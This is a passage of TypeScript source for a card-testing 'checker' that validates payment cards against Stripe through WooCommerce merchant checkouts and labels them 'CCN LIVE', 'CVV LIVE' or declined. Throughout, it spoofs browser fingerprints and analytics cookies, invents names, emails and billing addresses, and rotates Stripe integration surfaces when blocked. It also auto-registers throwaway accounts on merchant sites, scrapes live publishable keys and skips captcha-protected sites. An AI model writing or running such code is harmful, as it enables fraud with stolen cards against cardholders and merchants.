            // out of payment_details / a nested intent object). Route it through
            // the full classifier so insufficient_funds / incorrect_cvc / etc.
            // become proper CCN/CVV LIVE instead of a flat "declined" � this is
            // exactly the detail the generic "Payment processing failed" hid.
            if (wcCode) {
              dbg(`[checker] ${gateName}: WC order #${wcOrderId} exposed decline_code=${wcCode} � classifying properly`);
              const classified = classifyDeclineCode(
                wcCode, STRIPE_DECLINE_MAP[wcCode] || wcMsg, undefined, gateName,
                { brand: declineMeta.brand, funding: declineMeta.funding, country: declineMeta.country, threeDs: "", billing },
              );
              classified.latency = Date.now() - start;
              classified.cardInfo = fullCardInfo;
              classified.rawSnippet = rawSnip;
              return classified;
            }

            // WC's generic catch-all ("Payment processing failed. Please retry.")
            // carries zero classification signal � Stripe's underlying response was
            // swallowed by the Store API. Surface as an error so it can be retried,
            // not as a confirmed decline that pollutes the live-card stats.
            const isGenericRetry = /payment processing failed.*please retry|please refresh|please try again/i.test(wcMsg);
            if (isGenericRetry) {
              dbg(`[checker] ${gateName}: WC order #${wcOrderId} returned generic retry � surfacing as error, not dead`);
              // Include the literal merchant message (truncated) so the operator
              // sees what the site actually said, not just our internal label.
              // The "Gateway Error" prefix keeps the live-card stats correct
              // (this is still an error, not a confirmed decline); the suffix
              // gives the diagnostic visibility the operator asked for.
              const wcMsgClean = wcMsg.replace(/\s+/g, " ").slice(0, 140);
              return {
                status: "error" as const,
                response: `Gateway Error: ${wcMsgClean} | ${declineMeta.brand} ${declineMeta.funding} [${declineMeta.country}] | WC #${wcOrderId}`,
                code: "wc_generic_retry",
                latency: Date.now() - start,
                gate: gateName,
                cardInfo: fullCardInfo,
                rawSnippet: rawSnip,
              };
            }
            dbg(`[checker] ${gateName}: WC order #${wcOrderId} declined � returning dead | ${wcMsg}`);
            return {
              status: "dead" as const,
              response: `DECLINED ? ${wcMsg} | ${declineMeta.brand} ${declineMeta.funding} [${declineMeta.country}]`,
              code: "wc_payment_declined",
              latency: Date.now() - start,
              gate: gateName,
              cardInfo: fullCardInfo,
              rawSnippet: rawSnip,
            };
          }

          const { clientSecret, piId } = piResult;
          const isSetupIntent = piId.startsWith("seti_");
          const intentType = isSetupIntent ? "setup_intents" : "payment_intents";

          const tokenResult = await tokenizePromise;

          let cardMeta = { brand: "UNKNOWN", funding: "unknown", country: "??", threeDs: "", billing };
          if (tokenResult?.response) {
            const brandMatch = tokenResult.response.match(/\b(VISA|MASTERCARD|AMEX|DISCOVER|JCB|DINERS)\b/i);
            const fundMatch = tokenResult.response.match(/\b(debit|credit|prepaid)\b/i);
            const countryMatch = tokenResult.response.match(/\[([A-Z]{2})\]/);
            const threeMatch = tokenResult.response.match(/\b(3DS|NO-3DS)\b/);
            if (brandMatch) cardMeta.brand = brandMatch[1].toUpperCase();
            if (fundMatch) cardMeta.funding = fundMatch[1].toLowerCase();
            if (countryMatch) cardMeta.country = countryMatch[1];
            if (threeMatch) cardMeta.threeDs = threeMatch[1];
          }

          {
            dbg(`[checker] ${gateName}: Creating fresh token for ${intentType}/${piId} confirm`);

            const stripeVer = pick(STRIPE_JS_VERSIONS);
            const freshTokenBody = new URLSearchParams({
              "card[number]": cardNumber.trim(),
              "card[cvc]": cvv.trim(),
              "card[exp_month]": month,
              "card[exp_year]": year,
              "card[address_zip]": billing.zip,
              "card[address_country]": billing.country,
              guid: crypto.randomUUID(),
              muid: crypto.randomUUID(),
              sid: crypto.randomUUID(),
              payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; card-element`,
              time_on_page: String(Math.floor(Math.random() * 30000) + 5000),
              key: publicKey,
            });
            const freshTokenResp = await fetch("https://api.stripe.com/v1/tokens", {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                Accept: "application/json",
                Origin: "https://js.stripe.com",
                Referer: "https://js.stripe.com/",
                "User-Agent": ua,
              },
              body: freshTokenBody.toString(),
            });
            const freshToken = await freshTokenResp.json();
            const freshTokenId = freshToken?.id;

            if (!freshTokenId || !freshTokenId.startsWith("tok_")) {
              dbg(`[checker] ${gateName}: Fresh token creation failed: ${JSON.stringify(freshToken?.error || {}).substring(0, 100)}`);
              if (freshToken?.error) {
                const errCode = freshToken.error.decline_code || freshToken.error.code || "";
                if (CCN_LIVE_CODES.includes(errCode) || CCN_WRONG_CVV_CODES.includes(errCode)) {
                  const isWrongCvv = CCN_WRONG_CVV_CODES.includes(errCode);
                  const errLabel = STRIPE_DECLINE_MAP[errCode] || freshToken.error.message || errCode;
                  return {
                    status: "live" as const,
                    response: isWrongCvv
                      ? `CCN LIVE ? CVV Wrong | ${errLabel} | ${cardMeta.brand} ${cardMeta.funding} [${cardMeta.country}]`
                      : `CCN LIVE ? ${errLabel} | ${cardMeta.brand} ${cardMeta.funding} [${cardMeta.country}]`,
                    code: errCode,
                    latency: Date.now() - start,
                    gate: gateName,
                    cardInfo: fullCardInfo,
                  };
                }
              }
            }

            if (freshTokenId) {
              dbg(`[checker] ${gateName}: Confirming ${intentType}/${piId} with fresh token ${freshTokenId}`);
            }

            const confirmBody = new URLSearchParams({
              "payment_method_data[type]": "card",
              ...(freshTokenId ? { "payment_method_data[card][token]": freshTokenId } : {
                "payment_method_data[card][number]": cardNumber.trim(),
                "payment_method_data[card][cvc]": cvv.trim(),
                "payment_method_data[card][exp_month]": month,
                "payment_method_data[card][exp_year]": year,
              }),
              "payment_method_data[billing_details][name]": name,
              "payment_method_data[billing_details][email]": email,
              "payment_method_data[billing_details][address][postal_code]": billing.zip,
              "payment_method_data[billing_details][address][country]": billing.country,
              expected_payment_method_type: "card",
              use_stripe_sdk: "true",
              key: publicKey,
              client_secret: clientSecret,
              "expand[0]": "payment_method",
              "expand[1]": "latest_charge.payment_method_details",
            });

            const confirmResp = await fetch(`https://api.stripe.com/v1/${intentType}/${piId}/confirm`, {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": ua,
                "sec-ch-ua": secChUa,
                Origin: "https://js.stripe.com",
                Referer: "https://js.stripe.com/",
              },
              body: confirmBody.toString(),
            });

            const confirmResult = await confirmResp.json();
            const pmChecks = confirmResult.payment_method?.card?.checks
              || confirmResult.last_payment_error?.payment_method?.card?.checks
              || confirmResult.last_setup_error?.payment_method?.card?.checks || {};
            const chargeChecks = confirmResult.latest_charge?.payment_method_details?.card?.checks || {};
            dbg(`[checker] ${gateName}: Confirm status=${confirmResult.status || "none"}, error=${confirmResult.error?.code || "none"}, decline=${confirmResult.error?.decline_code || confirmResult.last_payment_error?.decline_code || "none"}`);
            dbg(`[checker] ${gateName}: CVV checks: pm.cvc=${pmChecks.cvc_check || "n/a"}, charge.cvc=${chargeChecks.cvc_check || "n/a"}, pm.zip=${pmChecks.address_postal_code_check || "n/a"}`);
            dbg(`[checker] ${gateName}: Full PM type=${typeof confirmResult.payment_method}, PM card checks=${JSON.stringify(confirmResult.payment_method?.card?.checks || "none")}`);
            dbg(`[checker] ${gateName}: last_payment_error pm checks=${JSON.stringify(confirmResult.last_payment_error?.payment_method?.card?.checks || "none")}`);
            dbg(`[checker] ${gateName}: last_setup_error pm checks=${JSON.stringify(confirmResult.last_setup_error?.payment_method?.card?.checks || "none")}`);

            if (confirmResult.payment_method && typeof confirmResult.payment_method === "object" && confirmResult.payment_method.card) {
              const c = confirmResult.payment_method.card;
              cardMeta = {
                brand: (c.brand || "unknown").toUpperCase(),
                funding: c.funding || "unknown",
                country: c.country || "??",
                threeDs: c.three_d_secure_usage?.supported ? "3DS" : "NO-3DS",
                billing,
              };
            }

            if (confirmResult.status === "succeeded") {
              const chargeId = chargeIdOf(confirmResult);
              const confChecks = extractChecks(
                confirmResult.payment_method?.card?.checks
                || confirmResult.latest_charge?.payment_method_details?.card?.checks
              );
              return {
                status: "live" as const,
                response: formatCardResult({
                  tier: "CVV LIVE", mark: "?", detail: "Charge Confirmed",
                  brand: cardMeta.brand, funding: cardMeta.funding, country: cardMeta.country, threeDs: cardMeta.threeDs,
                  cvc: confChecks.cvc, avsZip: confChecks.avsZip, avsAddr: confChecks.avsAddr,
                  chargeId, intentId: piId,
                }),
                code: "charge_succeeded",
                latency: Date.now() - start,
                gate: gateName,
                cardInfo: fullCardInfo,
                chargeId, intentId: piId,
              };
            }

            // For 3DS: retrieve expanded PI to get CVC check, then run frictionless solver
            if (confirmResult.status === "requires_action" || confirmResult.status === "requires_source_action") {
              const initCvc = confirmResult.payment_method?.card?.checks?.cvc_check
                || confirmResult.latest_charge?.payment_method_details?.card?.checks?.cvc_check
                || pmChecks.cvc_check || chargeChecks.cvc_check;
              if (!initCvc || initCvc === "unchecked") {
                try {
                  const retrieveUrl = `https://api.stripe.com/v1/${intentType}/${piId}?key=${publicKey}&client_secret=${clientSecret}&expand[0]=payment_method&expand[1]=latest_charge.payment_method_details`;
                  const retrieveResp = await fetch(retrieveUrl, {
                    headers: { "User-Agent": ua, Origin: "https://js.stripe.com", Referer: "https://js.stripe.com/" },
                    signal: AbortSignal.timeout(6000),
                  });
                  const retrieved = await retrieveResp.json();
                  const rPmChecks = retrieved.payment_method?.card?.checks || {};
                  const rChargeChecks = retrieved.latest_charge?.payment_method_details?.card?.checks || {};
                  dbg(`[checker] ${gateName}: Retrieved PI cvc_check=${rPmChecks.cvc_check || "n/a"}, charge_cvc=${rChargeChecks.cvc_check || "n/a"}`);
                  // Merge enriched data into confirmResult so classifyStripeResponse sees the CVC check
                  if (retrieved.payment_method) (confirmResult as any).payment_method = retrieved.payment_method;
                  if (retrieved.latest_charge) (confirmResult as any).latest_charge = retrieved.latest_charge;
                  if (retrieved.next_action) (confirmResult as any).next_action = retrieved.next_action;
                } catch {}
              }
            }

            const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, publicKey);
            dbg(`[checker] ${gateName}: Classified confirm: status=${classified.status}, code=${classified.code}, response=${classified.response.substring(0, 80)}`);
            classified.latency = Date.now() - start;
            classified.cardInfo = fullCardInfo;
            // Inject "Charged $X.XX (pid Y)" so dashboard + telegram surface
            // the auto-detected gate amount and product used.
            classified.response = annotateAmount(classified.response, (piResult as any).detectedAmount, (piResult as any).detectedProductId, (piResult as any).detectedProductName);
            if (classified.status !== "error") return classified;
          }
        }

        const authResult = await Promise.race([
          checkCardStripeAuth(cardNumber, expMonth, expYear, cvv, publicKey, gateName, cleanSiteUrl, extras),
          new Promise<null>((resolve) => setTimeout(() => resolve(null), 12000)),
        ]);
        if (authResult && authResult.code !== "no_setup_intent") {
          authResult.latency = Date.now() - start;
          authResult.cardInfo = fullCardInfo;
          return authResult;
        }
      } catch (siteErr: any) {
        dbg(`[checker] ${gateName}: Site check error: ${siteErr.message}`);
      }
      return null;
    })();

    type RaceResult = { source: "site"; result: CheckResult | null } | { source: "token"; result: CheckResult };

    const result = await Promise.race([
      siteCheckPromise.then(r => ({ source: "site" as const, result: r })),
      tokenizePromise.then(r => ({ source: "token" as const, result: r })),
    ]);

    if (result.source === "site" && result.result && result.result.status !== "error") {
      return result.result;
    }

    if (result.source === "token") {
      const tokenRes = result.result;
      const isIntegrationSurfaceError = tokenRes.status === "error"
        && (tokenRes.response.includes("integration surface") || tokenRes.response.includes("publishable key"));
      const isTokenizedOnly = tokenRes.code === "tokenized" || tokenRes.code === "pm_created";

      const waitTime = (isIntegrationSurfaceError || isTokenizedOnly) ? 25000 : 3000;
      if (isIntegrationSurfaceError) {
        dbg(`[checker] ${gateName}: Tokenize blocked by integration surface, waiting ${waitTime/1000}s for site check...`);
      } else if (isTokenizedOnly) {
        dbg(`[checker] ${gateName}: Token-only result, waiting ${waitTime/1000}s for bank-confirmed site check...`);
      }

      const siteResult = await Promise.race([
        siteCheckPromise,
        new Promise<null>((resolve) => setTimeout(() => resolve(null), waitTime)),
      ]);
      if (siteResult && siteResult.status !== "error") {
        const siteIsTokenizedOnly = siteResult.code === "tokenized" || siteResult.code === "pm_created";
        if (!siteIsTokenizedOnly || !isTokenizedOnly) {
          dbg(`[checker] ${gateName}: Site check returned bank result: ${siteResult.response.substring(0, 60)}`);
          return siteResult;
        }
      }

      if (isIntegrationSurfaceError && siteResult) {
        return siteResult;
      }

      tokenRes.cardInfo = fullCardInfo;

      // Gate has a siteUrl but checkout never confirmed the card � don't count as live.
      // Only real charge/PI/SI responses from the site are treated as live.
      if (isTokenizedOnly) {
        const reason = siteResult ? "Checkout Error" : "Checkout Unreachable";
        return {
          ...tokenRes,
          status: "error" as const,
          response: tokenRes.response
            .replace("CCN LIVE ? Tokenized", "CCN ? Tokenized")
            .replace("No Bank Confirm", reason),
          code: "tokenized_no_checkout",
        };
      }
      return tokenRes;
    }

    // Site finished first but returned null/error � await token result
    const tokenResult = await tokenizePromise;
    tokenResult.cardInfo = fullCardInfo;
    // Same rule: site was available but checkout didn't confirm � not live
    if (tokenResult.code === "tokenized" || tokenResult.code === "pm_created") {
      return {
        ...tokenResult,
        status: "error" as const,
        response: tokenResult.response
          .replace("CCN LIVE ? Tokenized", "CCN ? Tokenized")
          .replace("No Bank Confirm", "Checkout Unreachable"),
        code: "tokenized_no_checkout",
      };
    }
    return tokenResult;
  } catch (e: any) {
    return { status: "error", response: `Charge Error: ${e.message}`, code: "network_error", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
  }
}

export async function checkCardStripe(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl?: string
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 4) year = year.slice(-2);
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;

  const cleanSiteUrl = siteUrl?.replace(/\/+$/, "") || "";

  if (cleanSiteUrl) {
    try {
      const authResult = await Promise.race([
        checkCardStripeAuth(cardNumber, expMonth, expYear, cvv, publicKey, gateName, cleanSiteUrl),
        new Promise<null>((resolve) => setTimeout(() => resolve(null), 8000)),
      ]);
      if (authResult && authResult.code !== "no_setup_intent") {
        return authResult;
      }
      dbg(`[checker] Auth flow: no setup_intent, trying browser flow`);
    } catch (e: any) {
      dbg(`[checker] Auth flow error: ${e.message}, trying browser flow`);
    }

    try {
      const browserResult = await Promise.race([
        fullBrowserCheck(cardNumber.trim(), month, year, cvv.trim(), publicKey, cleanSiteUrl, gateName),
        new Promise<null>((resolve) => setTimeout(() => resolve(null), 8000)),
      ]);
      if (browserResult) {
        browserResult.latency = Date.now() - start;
        browserResult.cardInfo = fullCardInfo;
        return browserResult;
      }
    } catch (e: any) {
      dbg(`[checker] Browser flow error: ${e.message}, falling back to tokenize`);
    }
  }

  const result = await stripeTokenize(cardNumber.trim(), month, year, cvv.trim(), publicKey, gateName, cleanSiteUrl, start);
  result.cardInfo = fullCardInfo;
  return result;
}

/** Mod-10 Luhn check � catches garbled card numbers before wasting a check. */
function luhnCheck(num: string): boolean {
  let sum = 0;
  let alt = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num[i], 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

/**
 * Append ?_stripe_account=acct_... to a Stripe API URL when the merchant
 * uses Stripe Connect (platform key + connected account).  No-op when
 * connectedAccount is empty/undefined.
 */
function stripeConnectUrl(url: string, connectedAccount?: string): string {
  if (!connectedAccount) return url;
  const sep = url.includes("?") ? "&" : "?";
  return `${url}${sep}_stripe_account=${connectedAccount}`;
}

export function detectBrandFromBin(cc: string): string {
  if (/^4/.test(cc)) return "VISA";
  if (/^5[1-5]/.test(cc) || /^2[2-7]/.test(cc)) return "MASTERCARD";
  if (/^3[47]/.test(cc)) return "AMEX";
  if (/^6(?:011|5)/.test(cc)) return "DISCOVER";
  if (/^35/.test(cc)) return "JCB";
  if (/^3(?:0[0-5]|[68])/.test(cc)) return "DINERS";
  return "UNKNOWN";
}

async function stripeTokenize(
  cc: string, mm: string, yy: string, cvv: string,
  publicKey: string, gateName: string, siteUrl: string, start: number
): Promise<CheckResult> {
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const stripeVer = pick(STRIPE_JS_VERSIONS);
  const billing = await pickBilling(cc);
  const name = rndName();
  const email = rndEmail();
  const refDomain = siteUrl || "https://js.stripe.com";

  // Randomize sec-fetch-* headers for fingerprint diversity
  const secFetchDest  = pick(["empty", "empty", "empty", "document"]);      // mostly "empty" for API calls
  const secFetchMode  = pick(["cors", "cors", "no-cors", "same-origin"]);
  const secFetchSite  = pick(["same-site", "same-site", "cross-site"]);
  const secChMobile   = pick(["?0", "?0", "?0", "?1"]);                     // 75% desktop, 25% mobile
  const secChPlatform = secChMobile === "?1" ? '"Android"' : pick(['"Windows"', '"macOS"', '"Linux"']);
  const acceptLang    = pick(ACCEPT_LANGUAGE_OPTIONS);
  // Simulate realistic Google Analytics cookies that a real browser session would carry
  const gaId  = `GA1.1.${Math.floor(Math.random() * 900000000) + 100000000}.${Math.floor(Date.now() / 1000) - Math.floor(Math.random() * 86400)}`;
  const gidId = `GA1.1.${Math.floor(Math.random() * 900000000) + 100000000}.${Math.floor(Date.now() / 1000)}`;

  const stripeHeaders: Record<string, string> = {
    "Content-Type": "application/x-www-form-urlencoded",
    Accept: "application/json",
    "accept-language": acceptLang,
    Origin: "https://js.stripe.com",
    Referer: "https://js.stripe.com/",
    "User-Agent": ua,
    "sec-ch-ua": secChUa,
    "sec-ch-ua-mobile": secChMobile,
    "sec-ch-ua-platform": secChPlatform,
    "sec-fetch-dest": secFetchDest,
    "sec-fetch-mode": secFetchMode,
    "sec-fetch-site": secFetchSite,
    "Cookie": `_ga=${gaId}; _gid=${gidId}`,
  };

  const surfaces = [
    { type: "token", surface: "card-element",                endpoint: "tokens" },
    { type: "token", surface: "payment-element",             endpoint: "tokens" },
    { type: "pm",    surface: "split-card-element",          endpoint: "payment_methods" },
    { type: "pm",    surface: "payment-element",             endpoint: "payment_methods" },
    { type: "pm",    surface: "card-element",                endpoint: "payment_methods" },
    { type: "pm",    surface: "link-authentication-element", endpoint: "payment_methods" },
    { type: "pm",    surface: "express-checkout-element",    endpoint: "payment_methods" },
  ];

  let result: any = null;

  for (const { type, surface, endpoint } of surfaces) {
    const body = new URLSearchParams();
    if (type === "token") {
      body.set("card[number]", cc);
      body.set("card[cvc]", cvv);
      body.set("card[exp_month]", mm);
      body.set("card[exp_year]", yy);
      body.set("card[name]", name);
      body.set("card[address_zip]", billing.zip);
      body.set("card[address_country]", billing.country);
    } else {
      body.set("type", "card");
      body.set("billing_details[name]", name);
      body.set("billing_details[email]", email);
      body.set("billing_details[address][line1]", (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`);
      body.set("billing_details[address][city]", billing.city);
      body.set("billing_details[address][state]", billing.stateCode);
      body.set("billing_details[address][postal_code]", billing.zip);
      body.set("billing_details[address][country]", billing.country);
      body.set("card[number]", cc);
      body.set("card[cvc]", cvv);
      body.set("card[exp_month]", mm);
      body.set("card[exp_year]", yy);
    }
    body.set("guid", crypto.randomUUID());
    body.set("muid", crypto.randomUUID());
    body.set("sid", crypto.randomUUID());
    body.set("payment_user_agent", `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; ${surface}`);
    body.set("referrer", refDomain);
    body.set("time_on_page", String(Math.floor(Math.random() * 30000) + 5000));
    body.set("key", publicKey);

    try {
      const resp = await fetch(`https://api.stripe.com/v1/${endpoint}`, {
        method: "POST",
        headers: stripeHeaders,
        body: body.toString(),
      });
      result = await resp.json();

      if (result.id) break;

      const errMsg = result?.error?.message || "";
      const isIntegrationSurface = errMsg.includes("integration surface") || errMsg.includes("publishable key");
      if (!isIntegrationSurface) break;

      dbg(`[tokenize] Surface "${surface}" blocked for ${gateName}, trying next...`);
    } catch {
      continue;
    }
  }

  const latency = Date.now() - start;

  if (result?.id) {
    const card = result.card || {};
    const brand = (card.brand || "unknown").toUpperCase();
    const funding = card.funding || "unknown";
    const country = card.country || "??";
    const threeDs = card.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
    const cvcCheck = card.checks?.cvc_check;

    let cvcLabel = "CVV UNCHECKED";
    if (cvcCheck === "pass") cvcLabel = "CVV MATCH";
    else if (cvcCheck === "fail") cvcLabel = "CVV WRONG";

    if (result.id.startsWith("tok_") && cvcLabel === "CVV UNCHECKED") {
      dbg(`[tokenize] Got tok_ without CVV check, trying PM creation with token for ${gateName}...`);
      try {
        const pmFromToken = new URLSearchParams({
          type: "card",
          "card[token]": result.id,
          "billing_details[name]": name,
          "billing_details[address][postal_code]": billing.zip,
          "billing_details[address][country]": billing.country,
          key: publicKey,
        });
        const pmResp = await fetch("https://api.stripe.com/v1/payment_methods", {
          method: "POST",
          headers: stripeHeaders,
          body: pmFromToken.toString(),
        });
        const pmResult = await pmResp.json();
        if (pmResult.id) {
          const pmCard = pmResult.card || {};
          const pmBrand = (pmCard.brand || brand).toUpperCase();
          const pmFunding = pmCard.funding || funding;
          const pmCountry = pmCard.country || country;
          const pmThreeDs = pmCard.three_d_secure_usage?.supported ? "3DS" : "NO-3DS";
          const pmCvcCheck = pmCard.checks?.cvc_check;
          return {
            status: "live" as const,
            response: formatCardResult({
              tier: "CCN LIVE", mark: "?", detail: "Tokenized",
              brand: pmBrand, funding: pmFunding, country: pmCountry, threeDs: pmThreeDs,
              cvc: pmCvcCheck === "pass" ? "pass" : pmCvcCheck === "fail" ? "fail" : undefined,
              note: "No Bank Confirm", tokenId: pmResult.id,
            }),
            code: "pm_created",
            latency: Date.now() - start,
            gate: gateName,
            tokenId: result.id,
          };
        }
        if (pmResult.error) {
          const pmErrCode = pmResult.error.decline_code || pmResult.error.code || "unknown";
          const pmErrMsg = pmResult.error.message || "";
          const pmBinBrand = `${brand} ${funding} [${country}]`;
          if (!pmErrMsg.includes("integration surface") && !pmErrMsg.includes("publishable key") && pmResult.error.type !== "invalid_request_error") {
            if (CCN_WRONG_CVV_CODES.includes(pmErrCode)) {
              return { status: "live", response: `CCN LIVE ? CVV Wrong | ${STRIPE_DECLINE_MAP[pmErrCode] || pmErrMsg} | ${pmBinBrand}`, code: pmErrCode, latency: Date.now() - start, gate: gateName };
            }
            if (CCN_LIVE_CODES.includes(pmErrCode)) {
              return { status: "live", response: `CCN LIVE ? ${STRIPE_DECLINE_MAP[pmErrCode] || pmErrMsg} | ${pmBinBrand}`, code: pmErrCode, latency: Date.now() - start, gate: gateName };
            }
            if (DEAD_CODES.includes(pmErrCode)) {
              return { status: "dead", response: `DECLINED ? ${STRIPE_DECLINE_MAP[pmErrCode] || pmErrMsg} | ${pmBinBrand}`, code: pmErrCode, latency: Date.now() - start, gate: gateName };
            }
          }
        }
      } catch (pmErr: any) {
        dbg(`[tokenize] PM from token failed: ${pmErr.message}`);
      }
    }

    return {
      status: "live",
      response: formatCardResult({
        tier: "CCN LIVE", mark: "?", detail: "Tokenized",
        brand, funding, country, threeDs,
        cvc: cvcCheck === "pass" ? "pass" : cvcCheck === "fail" ? "fail" : undefined,
        note: "No Bank Confirm", tokenId: result.id,
      }),
      code: "pm_created",
      latency,
      gate: gateName,
      tokenId: result.id.startsWith("tok_") ? result.id : undefined,
    };
  }

  if (result.error) {
    const errCode = result.error.decline_code || result.error.code || "unknown";
    const errMsg = result.error.message || "Unknown error";

    const gatewayErrorCodes = ["processing_error", "rate_limit", "api_connection_error", "api_error"];
    const isGatewayError = gatewayErrorCodes.includes(errCode)
      || errMsg.includes("integration surface")
      || errMsg.includes("publishable key")
      || result.error.type === "invalid_request_error";

    if (isGatewayError) {
      return {
        status: "error",
        response: `Gateway Error: ${errMsg}`,
        code: errCode,
        latency,
        gate: gateName,
      };
    }

    const binBrand = detectBrandFromBin(cc);

    if (CCN_WRONG_CVV_CODES.includes(errCode)) {
      return {
        status: "live",
        response: `CCN LIVE ? CVV Wrong | ${STRIPE_DECLINE_MAP[errCode] || errMsg} | ${binBrand}`,
        code: errCode,
        latency,
        gate: gateName,
      };
    }

    if (CCN_LIVE_CODES.includes(errCode)) {
      return {
        status: "live",
        response: `CCN LIVE ? ${STRIPE_DECLINE_MAP[errCode] || errMsg} | ${binBrand}`,
        code: errCode,
        latency,
        gate: gateName,
      };
    }

    return {
      status: "dead",
      response: `DECLINED ? ${STRIPE_DECLINE_MAP[errCode] || errMsg || "Card Declined"} | ${binBrand}`,
      code: errCode,
      latency,
      gate: gateName,
    };
  }

  return {
    status: "error",
    response: "Unexpected Stripe response",
    code: "unknown",
    latency,
    gate: gateName,
  };
}

async function fullBrowserCheck(
  cc: string, mm: string, yy: string, cvv: string,
  publicKey: string, siteUrl: string, gateName: string
): Promise<CheckResult> {
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const email = rndEmail();
  const name = rndName();
  const billing = await pickBilling(cc);
  const stripeVer = pick(STRIPE_JS_VERSIONS);

  let state: SessionState = { ua, secChUa, cookies: "" };

  const accountPaths = ["/my-account/", "/account/"];
  let registerNonce: string | null = null;
  let registerPostPath = "";
  let accountPagePath = "";

  for (const path of accountPaths) {
    try {
      const resp = await sessionFetch(`${siteUrl}${path}`, state);
      state = resp.state;
      if (resp.ok) {
        registerNonce = extractBetween(resp.text, 'name="woocommerce-register-nonce" value="', '"')
          || extractBetween(resp.text, 'id="woocommerce-register-nonce" value="', '"');
        const wpReferer = extractBetween(resp.text, 'name="_wp_http_referer" value="', '"');
        registerPostPath = wpReferer || path;
        accountPagePath = path;

        const hasCaptcha = /captcha|recaptcha|hcaptcha|turnstile|robot/i.test(resp.text);
        if (registerNonce && !hasCaptcha) break;
        if (registerNonce && hasCaptcha) {
          registerNonce = null;
        }
      }
    } catch {}
  }

  let loggedIn = false;

  if (registerNonce) {
    const postUrl = registerPostPath.startsWith("http") ? registerPostPath : `${siteUrl}${registerPostPath}`;
    try {
      const regBody = new URLSearchParams({
        email, password: email,
        "woocommerce-register-nonce": registerNonce,
        _wp_http_referer: registerPostPath,
        register: "Register",
      }).toString();

      const regResp = await sessionFetch(postUrl, state, {
        method: "POST", body: regBody,
        contentType: "application/x-www-form-urlencoded",
        referer: `${siteUrl}${accountPagePath}`,
        origin: siteUrl,
      });
      state = regResp.state;
      loggedIn = state.cookies.includes("wordpress_logged_in") || state.cookies.includes("wp_woocommerce_session");
    } catch {}
  }

  let addCardNonce: string | null = null;
  let paymentPageUrl = "";

  if (loggedIn) {
    const addPaymentPaths = [
      "/my-account/add-payment-method/",
      "/account/add-payment-method/",
      "/my-account/payment-methods/",
    ];

    for (const path of addPaymentPaths) {
      try {
        const resp = await sessionFetch(`${siteUrl}${path}`, state, {
          referer: `${siteUrl}${accountPagePath || "/my-account/"}`,
        });
        state = resp.state;

        if (resp.ok) {
          addCardNonce = extractBetween(resp.text, '"add_card_nonce":"', '"')
            || extractBetween(resp.text, 'name="add_card_nonce" value="', '"')
            || extractBetween(resp.text, '"woocommerce-add-payment-method-nonce":"', '"')
            || extractBetween(resp.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            || extractBetween(resp.text, '"createAndConfirmSetupIntentNonce":"', '"');

          if (!publicKey) {
            const keyMatch = resp.text.match(/pk_live_[a-zA-Z0-9_-]{20,}/);
            if (keyMatch) publicKey = keyMatch[0];
          }

          if (addCardNonce) {
            paymentPageUrl = `${siteUrl}${path}`;
            break;
          }
        }
      } catch {}
    }
  }

  if (!publicKey) throw new Error("No Stripe public key found");

  const fp = { guid: crypto.randomUUID(), muid: crypto.randomUUID(), sid: crypto.randomUUID() };

  const pmBody = new URLSearchParams({
    type: "card",
    "billing_details[name]": name,
    "billing_details[email]": email,
    "billing_details[address][line1]": (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`,
    "billing_details[address][line2]": "",
    "billing_details[address][city]": billing.city,
    "billing_details[address][state]": billing.stateCode,
    "billing_details[address][postal_code]": billing.zip,
    "billing_details[address][country]": billing.country,
    "card[number]": cc,
    "card[cvc]": cvv,
    "card[exp_month]": mm,
    "card[exp_year]": yy,
    guid: fp.guid,
    muid: fp.muid,
    sid: fp.sid,
    payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; split-card-element`,
    referrer: siteUrl,
    time_on_page: String(Math.floor(Math.random() * 30000) + 5000),
    key: publicKey,
    "client_attribution_metadata[client_session_id]": crypto.randomUUID(),
    "client_attribution_metadata[merchant_integration_source]": "elements",
    "client_attribution_metadata[merchant_integration_subtype]": "split-card-element",
    "client_attribution_metadata[merchant_integration_version]": "2017",
  });

  const pmResp = await fetch("https://api.stripe.com/v1/payment_methods", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      Accept: "application/json",
      "accept-language": "en-US,en;q=0.9",
      Origin: "https://js.stripe.com",
      Referer: "https://js.stripe.com/",
      "User-Agent": ua,
      "sec-ch-ua": secChUa,
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
    },
    body: pmBody.toString(),
  });

  const pmResult = await pmResp.json();

  if (pmResult.error) {
    const errCode = pmResult.error.decline_code || pmResult.error.code || "unknown";
    const errMsg = pmResult.error.message || "Stripe error";
    const cardMeta = { brand: "UNKNOWN", funding: "unknown", country: "??", threeDs: "", billing };
    return classifyStripeResponse(pmResult, gateName, cardMeta);
  }

  const pmId = pmResult.id;
  if (!pmId) {
    return { status: "error", response: "No payment method ID", code: "no_pm_id", latency: 0, gate: gateName };
  }

  const card = pmResult.card || {};
  const brand = (card.brand || "unknown").toUpperCase();
  const funding = card.funding || "unknown";
  const country = card.country || "??";
